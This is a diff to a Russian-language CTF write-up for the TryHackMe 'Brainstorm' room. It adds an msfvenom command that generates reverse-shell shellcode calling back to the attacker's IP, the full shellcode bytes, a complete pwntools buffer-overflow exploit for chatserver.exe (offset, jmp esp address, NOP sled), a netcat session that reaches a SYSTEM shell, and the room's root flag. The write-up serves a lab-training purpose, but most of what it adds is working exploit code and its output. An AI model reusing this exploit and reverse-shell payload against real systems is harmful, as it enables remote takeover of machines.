@@ -595,40 +595,269 @@ Write a message:
 
 Теперь EIP в скрипте можно заменить на `EIP = 0x625014df`
 
-
-![nmap scan](screenshots/nmap_scan.png)
-
-
-
 ## 📂 Получение доступа
 
+Следующий шаг: создание полезной нагрузки.  
+Буду использовать `windows/shell_reverse_tcp` и сразу укажу свой `ip` в сети `thm`  
+```bash
+┌──(.venv)─(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Brainstorm/exploits]
+└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.21.104.16 LPORT=4444 -f py -b '\x00' -v stack
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+x86/shikata_ga_nai chosen with final size 351
+Payload size: 351 bytes
+Final size of py file: 1807 bytes
+stack =  b""
+stack += b"\xd9\xed\xba\x6e\x49\x7a\x91\xd9\x74\x24\xf4\x5d"
+stack += b"\x29\xc9\xb1\x52\x31\x55\x17\x83\xed\xfc\x03\x3b"
+stack += b"\x5a\x98\x64\x3f\xb4\xde\x87\xbf\x45\xbf\x0e\x5a"
+stack += b"\x74\xff\x75\x2f\x27\xcf\xfe\x7d\xc4\xa4\x53\x95"
+stack += b"\x5f\xc8\x7b\x9a\xe8\x67\x5a\x95\xe9\xd4\x9e\xb4"
+stack += b"\x69\x27\xf3\x16\x53\xe8\x06\x57\x94\x15\xea\x05"
+stack += b"\x4d\x51\x59\xb9\xfa\x2f\x62\x32\xb0\xbe\xe2\xa7"
+stack += b"\x01\xc0\xc3\x76\x19\x9b\xc3\x79\xce\x97\x4d\x61"
+stack += b"\x13\x9d\x04\x1a\xe7\x69\x97\xca\x39\x91\x34\x33"
+stack += b"\xf6\x60\x44\x74\x31\x9b\x33\x8c\x41\x26\x44\x4b"
+stack += b"\x3b\xfc\xc1\x4f\x9b\x77\x71\xab\x1d\x5b\xe4\x38"
+stack += b"\x11\x10\x62\x66\x36\xa7\xa7\x1d\x42\x2c\x46\xf1"
+stack += b"\xc2\x76\x6d\xd5\x8f\x2d\x0c\x4c\x6a\x83\x31\x8e"
+stack += b"\xd5\x7c\x94\xc5\xf8\x69\xa5\x84\x94\x5e\x84\x36"
+stack += b"\x65\xc9\x9f\x45\x57\x56\x34\xc1\xdb\x1f\x92\x16"
+stack += b"\x1b\x0a\x62\x88\xe2\xb5\x93\x81\x20\xe1\xc3\xb9"
+stack += b"\x81\x8a\x8f\x39\x2d\x5f\x1f\x69\x81\x30\xe0\xd9"
+stack += b"\x61\xe1\x88\x33\x6e\xde\xa9\x3c\xa4\x77\x43\xc7"
+stack += b"\x2f\x72\x81\xaf\xbf\xea\xab\x2f\xd1\xb6\x22\xc9"
+stack += b"\xbb\x56\x63\x42\x54\xce\x2e\x18\xc5\x0f\xe5\x65"
+stack += b"\xc5\x84\x0a\x9a\x88\x6c\x66\x88\x7d\x9d\x3d\xf2"
+stack += b"\x28\xa2\xeb\x9a\xb7\x31\x70\x5a\xb1\x29\x2f\x0d"
+stack += b"\x96\x9c\x26\xdb\x0a\x86\x90\xf9\xd6\x5e\xda\xb9"
+stack += b"\x0c\xa3\xe5\x40\xc0\x9f\xc1\x52\x1c\x1f\x4e\x06"
+stack += b"\xf0\x76\x18\xf0\xb6\x20\xea\xaa\x60\x9e\xa4\x3a"
+stack += b"\xf4\xec\x76\x3c\xf9\x38\x01\xa0\x48\x95\x54\xdf"
+stack += b"\x65\x71\x51\x98\x9b\xe1\x9e\x73\x18\x11\xd5\xd9"
+stack += b"\x09\xba\xb0\x88\x0b\xa7\x42\x67\x4f\xde\xc0\x8d"
+stack += b"\x30\x25\xd8\xe4\x35\x61\x5e\x15\x44\xfa\x0b\x19"
+stack += b"\xfb\xfb\x19"
+```
+
+Сохраняю `stack`, добавляю немного `nop` и проверяю против целевой машины, предварительно запустив `nc`  
+Итоговый код скрипта
+```python
+from pwn import *
+
+context.update(arch='i386')
+exe = './chatserver.exe'
+
+host = args.HOST or '10.10.116.242'
+port = int(args.PORT or 9999)
+
+def start_local(argv=[], *a, **kw):
+    '''Execute the target binary locally'''
+    if args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.EDB:
+        return process(['edb', '--run', exe] + argv, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+def start_remote(argv=[], *a, **kw):
+    '''Connect to the process on the remote host'''
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.LOCAL:
+        return start_local(argv, *a, **kw)
+    else:
+        return start_remote(argv, *a, **kw)
 
 
-## ⚙️ Привилегии
+# ==================== LOCAL  CONSTANTS =====================
+USERNAME = b'--pentest'
+RESPONSE_TIMEOUT = 2
+# ==================== OPTIMIZED FUZZER =====================
+def run_fuzzer():
+    io = start()
 
+    print(io.recvuntil(b'Please enter your username (max 20 characters): ').decode('utf-8'))
+    io.sendline(USERNAME)
+    print(USERNAME)
+    print(io.recvuntil(b'Write a message: ').decode('utf-8'))
 
+    pattern = cyclic(5000)  # Generate smart pattern
+    chunk_size = 100
+    max_size = 5000
+
+    for i in range(0, max_size, chunk_size):
+        try:
+            current_payload = pattern[:i]
+            log.info(f"Sending {len(current_payload)} bytes")
+
+            io.sendline(current_payload)
+            response = io.recv(timeout=RESPONSE_TIMEOUT)
+
+            if not response:
+                log.success(f"Server stopped responding at [{i}] bytes")
+                break
+
+            if b'Write a message:' not in response:
+                log.success(f"Unexpected response at [{i}] bytes")
+                break
+
+        except EOFError:
+            log.success(f"Server crashed at ~[{i}] bytes")
+            break
+        except Exception as e:
+            log.warning(f"Error at [{i}] bytes: {str(e)}")
+            break
+
+    # Try to interact if crash detected
+    try:
+        io.interactive()
+    except:
+        pass
+
+def get_offset():
+    eip_value = 0x75616164
+    offset = cyclic_find(p32(eip_value))
+    log.success(f"Offset [{offset}] bytes")
+
+def run_exploit():
+    offset = 2012
+    junk   = b'A' * offset
+    EIP    = 0x625014df         # 0x625014df : jmp esp
+    nop    = b'\x90' * 16
+
+    #exclude_list = ['\\x00']
+    #stack = ''.join(f'\\x{x:02x}' for x in range(1, 256) if f'\\x{x:02x}' not in exclude_list)
+
+    stack = b""
+    stack += b"\xd9\xed\xba\x6e\x49\x7a\x91\xd9\x74\x24\xf4\x5d"
+    stack += b"\x29\xc9\xb1\x52\x31\x55\x17\x83\xed\xfc\x03\x3b"
+    stack += b"\x5a\x98\x64\x3f\xb4\xde\x87\xbf\x45\xbf\x0e\x5a"
+    stack += b"\x74\xff\x75\x2f\x27\xcf\xfe\x7d\xc4\xa4\x53\x95"
+    stack += b"\x5f\xc8\x7b\x9a\xe8\x67\x5a\x95\xe9\xd4\x9e\xb4"
+    stack += b"\x69\x27\xf3\x16\x53\xe8\x06\x57\x94\x15\xea\x05"
+    stack += b"\x4d\x51\x59\xb9\xfa\x2f\x62\x32\xb0\xbe\xe2\xa7"
+    stack += b"\x01\xc0\xc3\x76\x19\x9b\xc3\x79\xce\x97\x4d\x61"
+    stack += b"\x13\x9d\x04\x1a\xe7\x69\x97\xca\x39\x91\x34\x33"
+    stack += b"\xf6\x60\x44\x74\x31\x9b\x33\x8c\x41\x26\x44\x4b"
+    stack += b"\x3b\xfc\xc1\x4f\x9b\x77\x71\xab\x1d\x5b\xe4\x38"
+    stack += b"\x11\x10\x62\x66\x36\xa7\xa7\x1d\x42\x2c\x46\xf1"
+    stack += b"\xc2\x76\x6d\xd5\x8f\x2d\x0c\x4c\x6a\x83\x31\x8e"
+    stack += b"\xd5\x7c\x94\xc5\xf8\x69\xa5\x84\x94\x5e\x84\x36"
+    stack += b"\x65\xc9\x9f\x45\x57\x56\x34\xc1\xdb\x1f\x92\x16"
+    stack += b"\x1b\x0a\x62\x88\xe2\xb5\x93\x81\x20\xe1\xc3\xb9"
+    stack += b"\x81\x8a\x8f\x39\x2d\x5f\x1f\x69\x81\x30\xe0\xd9"
+    stack += b"\x61\xe1\x88\x33\x6e\xde\xa9\x3c\xa4\x77\x43\xc7"
+    stack += b"\x2f\x72\x81\xaf\xbf\xea\xab\x2f\xd1\xb6\x22\xc9"
+    stack += b"\xbb\x56\x63\x42\x54\xce\x2e\x18\xc5\x0f\xe5\x65"
+    stack += b"\xc5\x84\x0a\x9a\x88\x6c\x66\x88\x7d\x9d\x3d\xf2"
+    stack += b"\x28\xa2\xeb\x9a\xb7\x31\x70\x5a\xb1\x29\x2f\x0d"
+    stack += b"\x96\x9c\x26\xdb\x0a\x86\x90\xf9\xd6\x5e\xda\xb9"
+    stack += b"\x0c\xa3\xe5\x40\xc0\x9f\xc1\x52\x1c\x1f\x4e\x06"
+    stack += b"\xf0\x76\x18\xf0\xb6\x20\xea\xaa\x60\x9e\xa4\x3a"
+    stack += b"\xf4\xec\x76\x3c\xf9\x38\x01\xa0\x48\x95\x54\xdf"
+    stack += b"\x65\x71\x51\x98\x9b\xe1\x9e\x73\x18\x11\xd5\xd9"
+    stack += b"\x09\xba\xb0\x88\x0b\xa7\x42\x67\x4f\xde\xc0\x8d"
+    stack += b"\x30\x25\xd8\xe4\x35\x61\x5e\x15\x44\xfa\x0b\x19"
+    stack += b"\xfb\xfb\x19"
+
+    payload = b''.join([
+        junk,
+        p32(EIP),
+        nop,
+        stack,
+    ])
+
+    try:
+        io = start()
+        print(io.recvuntil(b'Please enter your username (max 20 characters): ').decode('utf-8'))
+        io.sendline(USERNAME)
+        print(USERNAME)
+        print(io.recvuntil(b'Write a message: ').decode('utf-8'))
+        io.sendline(payload)
+        try:
+            response = io.recv(timeout=RESPONSE_TIMEOUT)
+            if response:
+                log.warning(f"Server responded unexpectedly: {response[:100]}...")
+            else:
+                log.success("Server stopped responding - likely crashed!")
+        except EOFError:
+            log.success("Connection closed by server - likely crashed!")
+
+    except Exception as e:
+        log.error(f"Error during exploitation: {str(e)}")
+    finally:
+        try:
+            io.close()
+        except:
+            pass
+
+# ==================== MAIN =====================
+if __name__ == '__main__':
+    #run_fuzzer()
+    #get_offset()
+    run_exploit()
+```
+
+Получаю reverse shell и читаю флаг
+```bash
+┌──(kali㉿0x2d-pentest)-[/media/sf_Exchange]
+└─$ nc -lvnp 4444        
+listening on [any] 4444 ...
+connect to [10.21.104.16] from (UNKNOWN) [10.10.116.242] 49228
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>cd c:\Users
+
+c:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is C87F-5040
+
+ Directory of c:\Users
+
+08/29/2019  10:20 PM    <DIR>          .
+08/29/2019  10:20 PM    <DIR>          ..
+08/29/2019  10:21 PM    <DIR>          drake
+11/21/2010  12:16 AM    <DIR>          Public
+               0 File(s)              0 bytes
+               4 Dir(s)  19,695,824,896 bytes free
+
+c:\Users>cd drake\Desktop
+
+c:\Users\drake\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is C87F-5040
+
+ Directory of c:\Users\drake\Desktop
+
+08/29/2019  10:55 PM    <DIR>          .
+08/29/2019  10:55 PM    <DIR>          ..
+08/29/2019  10:55 PM                32 root.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  19,695,800,320 bytes free
+
+c:\Users\drake\Desktop>more root.txt
+more root.txt
+5b1001de5a44eca47eee71e7942a8f8aex
+```
 
 ## 🏁 Флаги
-
-- User flag: 
-- Root flag: 
+ 
+- Root flag: 5b1001de5a44eca47eee71e7942a8f8aex 
 
 ---
-
-## 📋 Резюме
-
-🧰 **Инструменты:**
-  - nmap, ffuf, и др.
-
-🚨 **Уязвимости, которые удалось обнаружить:**  
-  - Directory Traversal  
-  - RCE через уязвимый скрипт  
-
-🛡 **Советы по защите:**
-  - Использовать сложные пароли и ограничить число попыток входа
-  - Обновлять ПО до актуальных версий
-  - Удалять/ограничивать использование SUID-бинарников
-  - Настроить логирование и мониторинг системных событий
-  - Применять принцип наименьших привилегий
-
-
